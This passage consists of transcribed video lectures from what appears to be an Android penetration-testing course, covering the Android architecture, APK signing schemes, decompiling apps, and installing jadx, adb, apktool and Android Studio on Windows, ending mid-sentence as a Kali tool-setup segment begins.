00:19:57.720 --> 00:20:00.920
such as our notifications maybe your application pops

455
00:20:00.920 --> 00:20:04.000
up a reminder when your appointment is due

456
00:20:04.000 --> 00:20:05.760
or you need to go and do something

457
00:20:05.760 --> 00:20:09.240
right allows for telephony making and receiving calls

458
00:20:09.240 --> 00:20:11.940
package management now this one is actually pretty

459
00:20:11.940 --> 00:20:16.480
important for applications because this manages looking for

460
00:20:16.480 --> 00:20:19.220
updates for our application as well as ensuring

461
00:20:19.220 --> 00:20:22.420
integrity of those updates so if the application

462
00:20:22.420 --> 00:20:25.040
developer pushes out a new critical update to

463
00:20:25.040 --> 00:20:27.560
resolve some issues this is what we would

464
00:20:27.560 --> 00:20:30.660
utilize to make the application actually update and

465
00:20:30.660 --> 00:20:32.140
go out and look for the updates.

466
00:20:32.900 --> 00:20:35.940
Also things like the location manager this would

467
00:20:35.940 --> 00:20:38.220
get your find in coarse-grained locations for

468
00:20:38.220 --> 00:20:41.180
your application if you need location services for

469
00:20:41.180 --> 00:20:42.760
whatever the application is.

470
00:20:44.620 --> 00:20:47.980
Okay and the last and final area of

471
00:20:47.980 --> 00:20:51.320
the Android architecture is the system applications layer

472
00:20:51.320 --> 00:20:52.980
and this is where we're going to find

473
00:20:52.980 --> 00:20:55.960
our pre-installed applications on the Android phone

474
00:20:55.960 --> 00:20:59.020
generic things like our contacts phone system settings

475
00:20:59.020 --> 00:21:03.220
text message apps camera etc also something has

476
00:21:03.220 --> 00:21:06.340
become very popular is that many Android phones

477
00:21:06.340 --> 00:21:09.680
come with some default Google applications installed like

478
00:21:09.680 --> 00:21:14.000
Gmail Google settings Google Maps all that kind

479
00:21:14.000 --> 00:21:16.920
of stuff right so Google applications can kind

480
00:21:16.920 --> 00:21:19.260
of be considered a system application at this

481
00:21:19.260 --> 00:21:22.060
point as well as many vendors such as

482
00:21:22.060 --> 00:21:26.140
Samsung etc have their own vendor specific applications

483
00:21:26.140 --> 00:21:29.480
that are pre-installed on the phone so

484
00:21:29.480 --> 00:21:31.940
these system applications are all what would be

485
00:21:31.940 --> 00:21:34.760
considered part of the system application layer kind

486
00:21:34.760 --> 00:21:38.140
of come generically installed on every phone now

487
00:21:38.140 --> 00:21:40.560
the cool thing about Android obviously is that

488
00:21:40.560 --> 00:21:43.300
customizability where you can always set up a

489
00:21:43.300 --> 00:21:45.840
new default app to replace a vendor supplied

490
00:21:45.840 --> 00:21:47.540
app or a system app if you don't

491
00:21:47.540 --> 00:21:49.580
like it so just remember you can always

492
00:21:49.580 --> 00:21:51.580
go into those settings and change those default

493
00:21:51.580 --> 00:21:54.080
apps if you're looking for using things that

494
00:21:54.080 --> 00:21:56.340
are not part of the system application layer

495
00:21:56.340 --> 00:21:59.940
okay so that wraps up our Android architecture

496
00:21:59.940 --> 00:22:02.840
hope you enjoyed the video and let's get

497
00:22:02.840 --> 00:22:04.200
into the next one


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.380 --> 00:00:02.420
(Transcribed by TurboScribe. Go Unlimited to remove this message.) All right, let's talk about the application security

2
00:00:02.420 --> 00:00:04.720
and signing processes for Android.

3
00:00:05.480 --> 00:00:07.380
So something to keep in mind for every

4
00:00:07.380 --> 00:00:10.200
Android application is that we will always be

5
00:00:10.200 --> 00:00:13.540
able to reverse engineer the application into its

6
00:00:13.540 --> 00:00:14.160
source code.

7
00:00:14.500 --> 00:00:16.280
We'll be able to change the source code,

8
00:00:16.520 --> 00:00:20.340
rebuild the Android application, resign it, and rerun

9
00:00:20.340 --> 00:00:21.720
it on our Android device.

10
00:00:22.140 --> 00:00:24.140
And because of this, this is why we

11
00:00:24.140 --> 00:00:27.080
want to only trust applications from certain places,

12
00:00:27.220 --> 00:00:29.240
such as the Google Play Store, because they

13
00:00:29.240 --> 00:00:32.260
have some additional processes to ensure that the

14
00:00:32.260 --> 00:00:34.940
application is actually legitimately made.

15
00:00:35.720 --> 00:00:39.180
But on the pentester's perspective, this means that

16
00:00:39.180 --> 00:00:41.460
the attacker always has the advantage.

17
00:00:41.800 --> 00:00:44.600
We can always modify the application functionality.

18
00:00:45.060 --> 00:00:47.660
We can always change the application back to

19
00:00:47.660 --> 00:00:50.120
the source code, change it, or take a

20
00:00:50.120 --> 00:00:52.820
look at what the application developer actually did

21
00:00:52.820 --> 00:00:53.760
with the source code.

22
00:00:54.360 --> 00:00:55.760
And in this course, we're going to be

23
00:00:55.760 --> 00:00:58.600
using tools, such as JADAC's GUI and APK

24
00:00:58.600 --> 00:01:01.660
tool, to allow us to decompile an application

25
00:01:01.660 --> 00:01:02.860
into its source code.

26
00:01:03.360 --> 00:01:05.480
And the two processes here, highlighted in the

27
00:01:05.480 --> 00:01:08.800
right-hand box, is how application development looks

28
00:01:08.800 --> 00:01:09.680
for a developer.

29
00:01:10.260 --> 00:01:13.000
They'll be coding in Java or Kotlin and

30
00:01:13.000 --> 00:01:15.380
converting that code into DEX bytecode when they

31
00:01:15.380 --> 00:01:17.280
actually go and run the application.

32
00:01:18.120 --> 00:01:20.640
And the reverse engineer has the opposite process.

33
00:01:21.260 --> 00:01:23.520
They are starting with the DEX bytecode, which

34
00:01:23.520 --> 00:01:25.040
is given to them as part of the

35
00:01:25.040 --> 00:01:26.140
Android APK.

36
00:01:26.140 --> 00:01:29.520
Converting that to SMALI, and then decompiling that

37
00:01:29.520 --> 00:01:33.700
SMALI into Java, using tools such as JADAC's

38
00:01:33.700 --> 00:01:35.260
GUI or APK tool.

39
00:01:37.990 --> 00:01:39.950
And so here is kind of how an

40
00:01:39.950 --> 00:01:43.770
Android application looks when compared to a normal

41
00:01:43.770 --> 00:01:44.810
Java application.

42
00:01:45.150 --> 00:01:47.090
On our left-hand side, we have our

43
00:01:47.090 --> 00:01:48.530
normal Java application.

44
00:01:49.070 --> 00:01:50.810
We have our Java source code, which is

45
00:01:50.810 --> 00:01:53.430
put through a Java compiler and turned into

46
00:01:53.430 --> 00:01:56.150
Java bytecode, and then is run on the

47
00:01:56.150 --> 00:01:57.130
Java VM.

48
00:01:58.170 --> 00:01:59.750
As you can see, on the right-hand

49
00:01:59.750 --> 00:02:03.410
side, Android applications have some additional steps they

50
00:02:03.410 --> 00:02:05.810
need to go through, just to ensure that

51
00:02:05.810 --> 00:02:09.150
that is running properly in a sandboxed environment

52
00:02:09.150 --> 00:02:10.130
on the phone.

53
00:02:10.570 --> 00:02:12.390
So you have your Java source code, which

54
00:02:12.390 --> 00:02:13.730
goes through the Java compiler.

55
00:02:14.010 --> 00:02:17.250
Again, a developer will be coding in Java.

56
00:02:18.090 --> 00:02:20.470
After it goes through the Java compiler, it

57
00:02:20.470 --> 00:02:22.190
will be turned into Java bytecode.

58
00:02:22.190 --> 00:02:24.790
And then that will be converted into Dalvik

59
00:02:24.790 --> 00:02:25.370
bytecode.

60
00:02:25.810 --> 00:02:27.770
And on the bottom of this picture, it

61
00:02:27.770 --> 00:02:28.910
highlights the Dalvik VM.

62
00:02:29.390 --> 00:02:32.070
Just remember that today, that Dalvik VM has

63
00:02:32.070 --> 00:02:34.150
been replaced by the Android runtime.

64
00:02:36.690 --> 00:02:39.050
And so when we talk about application signing,

65
00:02:39.230 --> 00:02:41.930
this is actually very important for applications.

66
00:02:42.370 --> 00:02:45.130
Because if our application is signed by some

67
00:02:45.130 --> 00:02:47.770
third-party person or a malicious user, and

68
00:02:47.770 --> 00:02:49.630
we go and run it, it could have

69
00:02:49.630 --> 00:02:51.670
changed source code within it, right?

70
00:02:51.670 --> 00:02:55.090
So anyone can go out there, modify an

71
00:02:55.090 --> 00:02:57.650
application, and try to publish it to the

72
00:02:57.650 --> 00:03:00.310
Play Store or publish it on some third

73
00:03:00.310 --> 00:03:02.190
-party application store, right?

74
00:03:02.550 --> 00:03:05.270
So how do we ensure that an application

75
00:03:05.270 --> 00:03:09.370
actually is safe or that it has its

76
00:03:09.370 --> 00:03:10.330
integrity, right?

77
00:03:10.710 --> 00:03:13.670
And the answer here is public key cryptography.

78
00:03:14.370 --> 00:03:17.290
And how this works is that basically a

79
00:03:17.290 --> 00:03:20.390
developer will be signing their application with certain

80
00:03:20.390 --> 00:03:21.270
types of keys.

81
00:03:21.270 --> 00:03:22.930
And we'll see this when we look through

82
00:03:22.930 --> 00:03:24.950
the application, where we'll be able to see

83
00:03:24.950 --> 00:03:26.910
different types of signature schemes.

84
00:03:27.410 --> 00:03:30.010
So today, there are three methods of APK

85
00:03:30.010 --> 00:03:30.930
signature schemes.

86
00:03:31.250 --> 00:03:33.710
We have version 1, version 2, and version

87
00:03:33.710 --> 00:03:36.890
3, each with additional security as you go

88
00:03:36.890 --> 00:03:38.070
up those different schemes.

89
00:03:38.630 --> 00:03:41.210
Many applications these days are signed with either

90
00:03:41.210 --> 00:03:43.150
version 2 or version 3.

91
00:03:44.050 --> 00:03:47.010
And in addition, Google has actually implemented a

92
00:03:47.010 --> 00:03:49.670
special version of signing called Google Play Signing,

93
00:03:49.970 --> 00:03:53.150
which adds another unique signature to the application.

94
00:03:53.710 --> 00:03:56.150
If we look at our process on the

95
00:03:56.150 --> 00:03:58.890
top hand corner of the screen, you'll see

96
00:03:58.890 --> 00:04:01.050
the developer has their own key that they're

97
00:04:01.050 --> 00:04:02.870
uploading to the Google Play Store.

98
00:04:03.090 --> 00:04:05.510
The application, when they build it in Android

99
00:04:05.510 --> 00:04:09.430
Studio, for example, that application is signed by

100
00:04:09.430 --> 00:04:10.050
that key.

101
00:04:10.430 --> 00:04:12.690
When they upload it to Google, Google also

102
00:04:12.690 --> 00:04:15.250
provides an app signing key that is unique

103
00:04:15.250 --> 00:04:16.290
to that application.

104
00:04:16.670 --> 00:04:20.149
So it prevents people from trying to impersonate

105
00:04:20.149 --> 00:04:22.450
the Google Play Store or making someone think

106
00:04:22.450 --> 00:04:25.290
that the application is legitimate when it's truly

107
00:04:25.290 --> 00:04:25.690
not.

108
00:04:26.370 --> 00:04:29.090
After the application is signed by both parties,

109
00:04:29.270 --> 00:04:30.610
then it will go out to the user

110
00:04:30.610 --> 00:04:32.150
via the Google Play Store.

111
00:04:32.990 --> 00:04:34.790
And what we talk about in this course,

112
00:04:35.530 --> 00:04:39.290
when we're rebuilding and re-signing applications, we're

113
00:04:39.290 --> 00:04:41.130
going to be using three different tools.

114
00:04:41.270 --> 00:04:43.510
Key tool, jar signer, and zip align.

115
00:04:43.950 --> 00:04:45.830
And this will become important when we're actually

116
00:04:45.830 --> 00:04:49.770
modifying source code for injection of our tool

117
00:04:49.770 --> 00:04:50.510
called Frida.

118
00:04:50.910 --> 00:04:53.130
So we'll be actually changing some source code

119
00:04:53.130 --> 00:04:56.810
in this course and then rebuilding the application

120
00:04:56.810 --> 00:04:58.110
using these tools.

121
00:04:58.510 --> 00:05:00.670
Key tool will help us to generate keys

122
00:05:00.670 --> 00:05:02.390
to sign the application with.

123
00:05:02.790 --> 00:05:05.170
Jar signer will actually execute the signing.

124
00:05:05.650 --> 00:05:08.810
And zip align will zip up the entire

125
00:05:08.810 --> 00:05:11.590
application and make sure that it's meeting all

126
00:05:11.590 --> 00:05:15.510
the specifications and that everything is aligned properly

127
00:05:15.510 --> 00:05:17.630
for the application to run on our Android

128
00:05:17.630 --> 00:05:18.070
phones.

129
00:05:18.370 --> 00:05:20.590
So that's everything there is to know about

130
00:05:20.590 --> 00:05:22.670
application signatures in Android.

131
00:05:23.010 --> 00:05:25.010
Just remember that they're very important when it

132
00:05:25.010 --> 00:05:28.550
comes to ensuring the application's integrity and ensuring

133
00:05:28.550 --> 00:05:31.230
that these applications are signed when they come

134
00:05:31.230 --> 00:05:32.890
to you as the end user.

135
00:05:33.430 --> 00:05:35.050
And also something to keep in mind is

136
00:05:35.050 --> 00:05:38.930
that Android phones have to have the applications

137
00:05:38.930 --> 00:05:39.870
be signed.

138
00:05:40.230 --> 00:05:42.230
If the application is not signed, it will

139
00:05:42.230 --> 00:05:43.910
not run on your Android phone.

140
00:05:44.010 --> 00:05:46.130
So it's part of the native security when

141
00:05:46.130 --> 00:05:48.730
it comes to running any applications on your

142
00:05:48.730 --> 00:05:49.490
Android phone.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 4: Android-Lab-Setup

WEBVTT

1
00:00:00.010 --> 00:00:03.150
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's get started by installing JADAX GUI

2
00:00:03.150 --> 00:00:03.850
on Windows.

3
00:00:04.230 --> 00:00:05.810
So here I am on Google, and the

4
00:00:05.810 --> 00:00:07.790
first thing you need to do is first

5
00:00:07.790 --> 00:00:08.790
install Java.

6
00:00:08.970 --> 00:00:11.290
Now this is pretty easy to install, all

7
00:00:11.290 --> 00:00:13.310
you need to do is click Java download,

8
00:00:13.590 --> 00:00:15.930
and then follow all the default prompts for

9
00:00:15.930 --> 00:00:16.950
the Java download.

10
00:00:17.430 --> 00:00:19.730
You're going to need Java installed first for

11
00:00:19.730 --> 00:00:22.330
your Windows machine for JADAX to work properly.

12
00:00:22.770 --> 00:00:24.410
So please take a moment, go out and

13
00:00:24.410 --> 00:00:26.250
do that, it's pretty easy to install.

14
00:00:27.610 --> 00:00:29.670
Now, when it comes to JADAX, I'm going

15
00:00:29.670 --> 00:00:32.890
to go back to Google here, and now

16
00:00:32.890 --> 00:00:34.770
I just need to search for JADAX.

17
00:00:35.010 --> 00:00:36.610
And it's going to be this first result,

18
00:00:36.730 --> 00:00:40.470
the SkyLot JADAX DEX2 Java Decompiler on GitHub.

19
00:00:41.370 --> 00:00:44.910
And for Windows here, we can scroll down

20
00:00:44.910 --> 00:00:47.170
to the releases on the right hand side,

21
00:00:48.430 --> 00:00:50.310
scroll down a bit more, and we can

22
00:00:50.310 --> 00:00:53.530
actually take this JADAX GUI 1.2.0,

23
00:00:53.650 --> 00:00:57.190
nojrewin.exe. I'm going to download this, it

24
00:00:57.190 --> 00:00:58.650
should download pretty quickly.

25
00:00:59.370 --> 00:01:01.350
Once it's done, I'm going to click open.

26
00:01:02.450 --> 00:01:04.650
And now you will get this Windows Defender

27
00:01:04.650 --> 00:01:06.570
prompt, and you can actually just skip over

28
00:01:06.570 --> 00:01:08.570
this and do a run anyway.

29
00:01:14.260 --> 00:01:16.760
And now JADAX GUI will open in a

30
00:01:16.760 --> 00:01:17.480
separate window.

31
00:01:18.240 --> 00:01:21.460
It will ask you to download or open

32
00:01:21.460 --> 00:01:23.260
a file, I'm going to click cancel just

33
00:01:23.260 --> 00:01:24.600
to get to the UI here.

34
00:01:24.600 --> 00:01:26.320
And if you made it this far with

35
00:01:26.320 --> 00:01:28.140
your UI, you should be good to go

36
00:01:28.140 --> 00:01:29.200
with JADAX GUI.

37
00:01:30.620 --> 00:01:33.300
Another note is that you can actually add

38
00:01:33.300 --> 00:01:38.000
that exe that you downloaded to, say, C

39
00:01:38.000 --> 00:01:40.860
slash Windows so that JADAX GUI can actually

40
00:01:40.860 --> 00:01:42.840
be like a command line interface.

41
00:01:43.080 --> 00:01:45.460
We'll show something very similar to this with

42
00:01:45.460 --> 00:01:48.820
APK tool when we download that tool as

43
00:01:48.820 --> 00:01:49.040
well.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.540 --> 00:00:03.520
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay let's instal tools like adb on our

2
00:00:03.520 --> 00:00:04.640
windows machine now.

3
00:00:05.040 --> 00:00:06.140
All we need to do is go to

4
00:00:06.140 --> 00:00:09.820
google and search for android tools, and the

5
00:00:09.820 --> 00:00:12.460
sdk platform tools release notes is going to

6
00:00:12.460 --> 00:00:14.420
be right here, and this is where we're

7
00:00:14.420 --> 00:00:16.840
going to get access to tools like adb,

8
00:00:16.980 --> 00:00:18.720
which is going to allow us to get

9
00:00:18.720 --> 00:00:20.840
a shell on our android emulators.

10
00:00:21.480 --> 00:00:23.400
Now there are a few different ways of

11
00:00:23.400 --> 00:00:26.000
installing this, so if you have android studio

12
00:00:26.000 --> 00:00:28.700
already installed you can instal this through android

13
00:00:28.700 --> 00:00:33.180
studio, but personally I prefer using this out

14
00:00:33.180 --> 00:00:34.520
of this website, so I'm going to click

15
00:00:34.520 --> 00:00:37.600
the download sdk platform tools for windows here,

16
00:00:38.040 --> 00:00:42.100
scroll down and accept the licence agreement, it's

17
00:00:42.100 --> 00:00:45.160
going to download this platform tools zip file

18
00:00:45.160 --> 00:00:50.130
here, I'm going to open that when it's

19
00:00:50.130 --> 00:00:50.410
done.

20
00:00:56.010 --> 00:00:58.530
Okay so this is our folder that we

21
00:00:58.530 --> 00:01:01.370
downloaded, I'm going to click extract all, and

22
00:01:01.370 --> 00:01:04.069
now it's extracting the folder, this will just

23
00:01:04.069 --> 00:01:06.350
take a few seconds to extract everything.

24
00:01:12.900 --> 00:01:15.780
Okay and now that everything's extracted here we

25
00:01:15.780 --> 00:01:17.240
can go to the platform tools, you can

26
00:01:17.240 --> 00:01:19.440
see we have adb, fastboot, etc.

27
00:01:19.940 --> 00:01:22.480
Now what we can do is actually just

28
00:01:22.480 --> 00:01:26.340
cut this entire folder, and we can put

29
00:01:26.340 --> 00:01:30.400
this again in our local disc c, windows,

30
00:01:30.780 --> 00:01:33.220
and just literally paste it in here, and

31
00:01:33.220 --> 00:01:34.900
that will allow us to run all those

32
00:01:34.900 --> 00:01:35.280
tools.

33
00:01:35.760 --> 00:01:37.540
So I could just do a paste here,

34
00:01:37.640 --> 00:01:39.700
and this will allow us to run the

35
00:01:39.700 --> 00:01:41.400
tools that are in that folder, because this

36
00:01:41.400 --> 00:01:43.380
will be added to our environment variables.

37
00:01:43.820 --> 00:01:50.800
So I could just do a paste, take

38
00:01:50.800 --> 00:01:52.360
a few seconds, I'm just going to cancel

39
00:01:52.360 --> 00:01:54.700
this for this case, but you can do

40
00:01:54.700 --> 00:01:57.240
that as one way, and again the other

41
00:01:57.240 --> 00:01:59.080
way that you could get these tools to

42
00:01:59.080 --> 00:02:02.860
run, you could do system environment variables here,

43
00:02:03.340 --> 00:02:06.140
again once this is open you can go

44
00:02:06.140 --> 00:02:09.080
to environment variables, go to your path, and

45
00:02:09.080 --> 00:02:11.920
add the directory to that platform tools folder.

46
00:02:12.040 --> 00:02:13.640
You can see here that mine is pointed

47
00:02:13.640 --> 00:02:16.760
towards C colon slash slash windows slash platform

48
00:02:16.760 --> 00:02:18.880
tools, but you could also have this be

49
00:02:18.880 --> 00:02:21.080
anywhere on your file system if you wanted

50
00:02:21.080 --> 00:02:23.780
it to be under your user, or going

51
00:02:23.780 --> 00:02:24.800
to the downloads folder.

52
00:02:24.940 --> 00:02:26.820
I don't really recommend using the downloads folder

53
00:02:26.820 --> 00:02:29.760
because you might accidentally one day delete those

54
00:02:29.760 --> 00:02:31.440
tools, right, so you might want to put

55
00:02:31.440 --> 00:02:33.160
it in like documents or something that you

56
00:02:33.160 --> 00:02:34.520
know is not going to be moving.

57
00:02:35.440 --> 00:02:37.780
So there's two solutions on how to get

58
00:02:37.780 --> 00:02:41.100
that running, and once you have that done

59
00:02:41.100 --> 00:02:44.560
you can go to your command prompt, and

60
00:02:44.560 --> 00:02:46.260
you should be able to run the command

61
00:02:46.260 --> 00:02:49.220
adb, and once you get this manual page

62
00:02:49.220 --> 00:02:50.660
here you should be good to go for

63
00:02:50.660 --> 00:02:51.380
adb.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:03.490
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's instal APK tool for Windows now.

2
00:00:03.610 --> 00:00:04.850
So I'm going to go to Google again,

3
00:00:05.410 --> 00:00:07.650
type in APK tool, and here it is

4
00:00:07.650 --> 00:00:08.750
for ibot peaches.

5
00:00:09.370 --> 00:00:11.890
Now again, APK tool is going to be

6
00:00:11.890 --> 00:00:16.090
utilised to help us reverse engineer Android APKs

7
00:00:16.090 --> 00:00:17.910
and do a static analysis manually.

8
00:00:18.850 --> 00:00:21.450
We can go here and open link a

9
00:00:21.450 --> 00:00:23.330
new tab for the instal documentation.

10
00:00:24.030 --> 00:00:25.510
And this is going to be pretty important

11
00:00:25.510 --> 00:00:27.750
for Windows, because it takes a few steps

12
00:00:27.750 --> 00:00:29.110
to get this running properly.

13
00:00:29.970 --> 00:00:31.750
So first thing it says is download the

14
00:00:31.750 --> 00:00:32.950
Windows wrapper script.

15
00:00:33.430 --> 00:00:35.170
So I'm going to right click this and

16
00:00:35.170 --> 00:00:37.950
click Save link as, and then we're going

17
00:00:37.950 --> 00:00:44.840
to go to our downloads here and save

18
00:00:44.840 --> 00:00:49.990
this as APK tool dot bat, just like

19
00:00:49.990 --> 00:00:52.970
this APK tool dot bat, save.

20
00:00:54.130 --> 00:00:56.690
Now it says download APK tool to my

21
00:00:56.690 --> 00:01:00.430
open this in a new tab and download

22
00:01:00.430 --> 00:01:03.230
this APK tool dot jar, the very first

23
00:01:03.230 --> 00:01:03.690
result.

24
00:01:06.350 --> 00:01:10.750
Okay, I'm going to click Keep here, show

25
00:01:10.750 --> 00:01:11.750
this in my folder.

26
00:01:26.910 --> 00:01:28.650
And we can see in our folder here,

27
00:01:28.830 --> 00:01:31.810
I have this APK tool underscore 2.6

28
00:01:31.810 --> 00:01:34.790
.0. But it says in the instal documents

29
00:01:34.790 --> 00:01:37.390
to rename the downloaded jar file to APK

30
00:01:37.390 --> 00:01:38.530
tool dot jar.

31
00:01:39.070 --> 00:01:40.930
So I'm just going to go here, click

32
00:01:40.930 --> 00:01:41.630
Rename.

33
00:01:42.870 --> 00:01:46.190
And delete these numbers and the under the

34
00:01:46.190 --> 00:01:48.250
underscore there and click Enter.

35
00:01:48.410 --> 00:01:50.370
So we have APK tool dot bat and

36
00:01:50.370 --> 00:01:52.390
APK tool dot jar right here.

37
00:01:53.130 --> 00:01:55.090
Now it says move both files to your

38
00:01:55.090 --> 00:01:56.290
Windows directory.

39
00:01:56.570 --> 00:01:59.590
So we're gonna click Control.

40
00:01:59.790 --> 00:02:01.950
So I highlight both of these, right click

41
00:02:01.950 --> 00:02:03.210
them, cut.

42
00:02:03.870 --> 00:02:07.169
Then we're going to go to our this

43
00:02:07.169 --> 00:02:11.030
PC, and then see local disc here, and

44
00:02:11.030 --> 00:02:11.890
then Windows.

45
00:02:13.650 --> 00:02:14.770
And once we're here, all we have to

46
00:02:14.770 --> 00:02:16.010
do is hit Control V.

47
00:02:16.550 --> 00:02:18.390
And in my case, I already have these

48
00:02:18.390 --> 00:02:19.350
files in here.

49
00:02:20.030 --> 00:02:21.790
So I'm going to replace the files in

50
00:02:21.790 --> 00:02:22.430
the destination.

51
00:02:22.670 --> 00:02:23.810
But if you're doing this for the first

52
00:02:23.810 --> 00:02:25.650
time, this prompt will not come up.

53
00:02:26.670 --> 00:02:29.330
Okay, I'm going to click Continue and continue

54
00:02:29.330 --> 00:02:29.870
here.

55
00:02:31.090 --> 00:02:35.310
Okay, and now, since we have these put

56
00:02:35.310 --> 00:02:39.010
into C colon slash slash Windows, we'll be

57
00:02:39.010 --> 00:02:41.690
able to run APK tool via the command

58
00:02:41.690 --> 00:02:42.150
prompt.

59
00:02:42.750 --> 00:02:44.310
So here's my command prompt.

60
00:02:44.530 --> 00:02:46.410
And I can just type in APK tool.

61
00:02:46.690 --> 00:02:49.010
And if you get this manual, then you

62
00:02:49.010 --> 00:02:51.470
should be good to go for APK tool

63
00:02:51.470 --> 00:02:52.330
on Windows.

64
00:02:53.090 --> 00:02:55.610
Now something to note here is it says

65
00:02:55.610 --> 00:02:57.410
if you do not have access to C

66
00:02:57.410 --> 00:03:00.090
colon slash slash, you may place the two

67
00:03:00.090 --> 00:03:02.750
files anywhere, then add that directory to your

68
00:03:02.750 --> 00:03:04.790
environment variable system path.

69
00:03:05.210 --> 00:03:09.010
So for example, if I wanted to, I

70
00:03:09.010 --> 00:03:11.370
could go to edit the system environment variables

71
00:03:11.370 --> 00:03:13.770
or edit the environment variables for your account

72
00:03:13.770 --> 00:03:15.710
depending on how much access you have on

73
00:03:15.710 --> 00:03:16.650
your Windows system.

74
00:03:17.250 --> 00:03:19.450
Here, I'll do the system environment variables.

75
00:03:20.310 --> 00:03:22.670
Now we can go to environment variables, go

76
00:03:22.670 --> 00:03:23.490
to path here.

77
00:03:23.970 --> 00:03:27.450
And then wherever you have that those that

78
00:03:27.450 --> 00:03:30.450
the the jar file and the APK tool

79
00:03:30.450 --> 00:03:33.550
dot bat file stored, you can add that

80
00:03:33.550 --> 00:03:37.230
directory right here so that it works properly.

81
00:03:37.570 --> 00:03:39.750
So we can add this.

82
00:03:40.010 --> 00:03:42.770
For example, we could go to browse as

83
00:03:42.770 --> 00:03:45.170
well, go to our downloads and add that

84
00:03:45.170 --> 00:03:48.710
stuff to our path here and it should

85
00:03:48.710 --> 00:03:51.010
execute properly if you do not have access

86
00:03:51.010 --> 00:03:52.930
to Windows if you're on, say, a locked

87
00:03:52.930 --> 00:03:54.010
down Windows machine.

88
00:03:54.630 --> 00:03:57.070
But in our case, I'll just do the

89
00:03:57.070 --> 00:04:00.090
C colon slash slash Windows to make it

90
00:04:00.090 --> 00:04:01.570
easier for the instal video.

91
00:04:01.690 --> 00:04:03.610
I wanted to throw that out there as

92
00:04:03.610 --> 00:04:06.470
an additional option if you're doing this on

93
00:04:06.470 --> 00:04:08.150
a more locked down Windows machine.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.500 --> 00:00:02.980
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay let's install Android Studio for Windows.

2
00:00:03.240 --> 00:00:04.520
So I'm just going to go to Google

3
00:00:04.520 --> 00:00:06.820
and again search for Android Studio.

4
00:00:07.280 --> 00:00:08.620
It's the first result here.

5
00:00:09.700 --> 00:00:12.060
Now the nice thing about Android Studio is

6
00:00:12.060 --> 00:00:14.720
it automatically detects what operating system you're running.

7
00:00:14.900 --> 00:00:16.560
So I'm just going to click download Android

8
00:00:16.560 --> 00:00:17.400
Studio here.

9
00:00:18.040 --> 00:00:20.240
You have to scroll down, click yes to

10
00:00:20.240 --> 00:00:22.960
the terms and conditions, and download Android Studio

11
00:00:22.960 --> 00:00:23.760
for Windows.

12
00:00:24.160 --> 00:00:25.760
Now this is going to take a few

13
00:00:25.760 --> 00:00:26.640
minutes to download.

14
00:00:28.820 --> 00:00:31.220
Okay now we can see that Android Studio

15
00:00:31.220 --> 00:00:33.580
has downloaded properly in the bottom left hand

16
00:00:33.580 --> 00:00:33.960
corner.

17
00:00:34.120 --> 00:00:35.920
I'm going to click open to open it.

18
00:00:39.140 --> 00:00:41.200
It should just take a second to open

19
00:00:41.200 --> 00:00:45.560
up and let me drag this over.

20
00:00:46.040 --> 00:00:48.120
So here we have our welcome to Android

21
00:00:48.120 --> 00:00:50.420
Studio setup and we can pretty much accept

22
00:00:50.420 --> 00:00:51.680
all the defaults here.

23
00:00:51.800 --> 00:00:53.660
So I'm going to click next and click

24
00:00:53.660 --> 00:00:54.140
next.

25
00:00:54.820 --> 00:00:56.800
As you can see Android Studio is pretty

26
00:00:56.800 --> 00:00:58.860
big like two and a half gigabytes for

27
00:00:58.860 --> 00:00:59.400
all the stuff.

28
00:00:59.540 --> 00:01:01.400
So you definitely want to have some storage

29
00:01:01.400 --> 00:01:02.500
space on your machine.

30
00:01:03.099 --> 00:01:06.200
I'm going to click next here, install, and

31
00:01:06.200 --> 00:01:08.520
this will start installing all the different packages

32
00:01:08.520 --> 00:01:10.400
that Android Studio is going to need to

33
00:01:10.400 --> 00:01:11.340
run properly.

34
00:01:16.160 --> 00:01:18.860
Okay and now that Android Studio installation is

35
00:01:18.860 --> 00:01:20.980
complete I'm going to click next and then

36
00:01:20.980 --> 00:01:23.360
finish and it will start Android Studio for

37
00:01:23.360 --> 00:01:24.180
its first run.

38
00:01:25.680 --> 00:01:28.720
Okay and this is actually opening a project

39
00:01:28.720 --> 00:01:31.380
that I already previously had open because Android

40
00:01:31.380 --> 00:01:33.700
Studio will save some information like that.

41
00:01:33.700 --> 00:01:36.240
But on your very first run instead of

42
00:01:36.240 --> 00:01:38.320
seeing this screen you will see a new

43
00:01:38.320 --> 00:01:40.360
project indicator screen.

44
00:01:40.580 --> 00:01:42.520
You can just click new project and name

45
00:01:42.520 --> 00:01:44.520
that project anything you want such as like

46
00:01:44.520 --> 00:01:47.620
test app or test 123 and then once

47
00:01:47.620 --> 00:01:49.380
you do that you'll come to a page

48
00:01:49.380 --> 00:01:49.980
like this.

49
00:01:50.440 --> 00:01:51.700
And if you made it this far then

50
00:01:51.700 --> 00:01:54.880
Android Studio is properly installed on Windows.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.440 --> 00:00:02.460
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay let's get started with the easiest way

2
00:00:02.460 --> 00:00:04.740
to install all the tools you'll need for

3
00:00:04.740 --> 00:00:06.600
this course on Kali Linux.

4
00:00:06.800 --> 00:00:08.820
We're going to use a special tool on

5
00:00:08.820 --> 00:00:10.600
github called pimpmykali.

6
00:00:10.840 --> 00:00:13.540
Now this video was actually released a little

7
00:00:13.540 --> 00:00:15.700
bit after all the other videos.

8
00:00:15.840 --> 00:00:17.720
The next four videos which follow for Kali

9
00:00:17.720 --> 00:00:19.680
Linux show how to install each of these

10
00:00:19.680 --> 00:00:22.940
tools manually, but now that we've updated pimpmykali

11
00:00:22.940 --> 00:00:28.180
to have the mobile application penetration tester tools

12
00:00:28.180 --> 00:00:29.600
in it, I want to show you this

13
00:00:29.600 --> 00:00:31.820
way so that you can easily install this

14
00:00:31.820 --> 00:00:32.620
